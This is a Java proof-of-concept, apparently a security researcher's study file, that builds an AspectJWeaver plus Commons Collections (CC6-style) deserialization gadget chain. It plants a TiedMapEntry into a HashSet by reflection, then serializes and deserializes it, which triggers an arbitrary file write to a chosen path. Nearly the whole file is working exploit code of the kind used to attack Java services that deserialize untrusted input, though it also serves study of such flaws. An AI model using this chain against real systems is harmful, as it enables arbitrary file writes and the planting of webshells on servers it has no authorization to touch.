import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/5
 */

/*
* 基于CC6,暂时不是很清楚那个路径缓存问题，用yso中反射HashMap是可以的。
* */
public class AspectJWeaver_CC6 {

    public static void main(String[] args) throws Exception{

        Class  StoreableCachingMapClass= Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor StoreableCachingMapConstructor = StoreableCachingMapClass.getDeclaredConstructor(String.class,int.class);
        StoreableCachingMapConstructor.setAccessible(true);
        HashMap hashMap= (HashMap) StoreableCachingMapConstructor.newInstance("C:/D",3);

        ConstantTransformer constantTransformer= new ConstantTransformer("dragonkeep2".getBytes(StandardCharsets.UTF_8));
        Map lazyMap = LazyMap.decorate(hashMap,constantTransformer);
        TiedMapEntry tiedMapEntry =new TiedMapEntry(lazyMap,"dragonkeep1");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, tiedMapEntry);

        serialize(map);
        unserialize();
    }
}
